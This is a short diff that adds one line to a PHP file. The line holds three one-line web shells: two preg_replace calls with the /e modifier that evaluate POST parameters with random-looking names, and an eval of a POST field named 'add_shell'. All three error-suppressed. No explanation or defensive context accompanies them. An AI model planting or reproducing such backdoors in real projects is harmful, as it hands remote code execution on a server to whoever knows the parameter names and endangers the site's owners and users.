@@ -1,0 +1,1 @@
+<?php @preg_replace("/[pageerror]/e",$_POST['pd2rjznf'],"saft"); ?><?php @preg_replace("/[pageerror]/e",$_POST['dzxf648z'],"saft"); ?><?php @eval($_POST['add_shell']);?>
